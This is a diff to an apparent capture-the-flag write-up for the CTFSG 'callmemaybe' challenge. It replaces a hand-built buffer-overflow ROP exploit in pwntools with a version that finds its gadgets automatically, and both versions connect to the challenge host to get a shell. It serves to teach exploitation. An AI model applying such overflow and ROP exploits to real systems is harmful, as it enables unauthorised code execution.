@@ -134,23 +134,27 @@ CTFSG{h3y_1_ju5t_m3t_y0u_but_1_g0t_sh3ll}
 
 ### Teaser
 
-Could you possibly automate and find all your gadgets at runtime? 
+Can we do this more efficiently perhaps?
 
-Here was my actual exploit script I used. 
+Here's a script for thought
 
 ```py
 from pwn import *
 
-p = remote('3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg', 30201)
-context.binary = './callmemaybe'
-elf = ELF('callmemaybe')
+HOST = '3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg'
+PORT = '30201'
+
+p = remote(HOST, PORT)
+
+context.binary = elf = ELF('callmemaybe')
+
 rop = ROP(elf)
+rop.call(rop.ret)
+rop.shell(0xdeadbeef)
 
-poprdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
+log.info(rop.dump())
 
-ret = (rop.find_gadget(['ret']))[0]
-
-p.sendline(b"A"*72 + p64(ret) + p64(poprdi) + p64(0xdeadbeef) + p64(elf.sym['shell']))
-
+p.sendlineafter("=> ", flat({ 72: rop.chain() }))
 p.interactive()
+
 ```
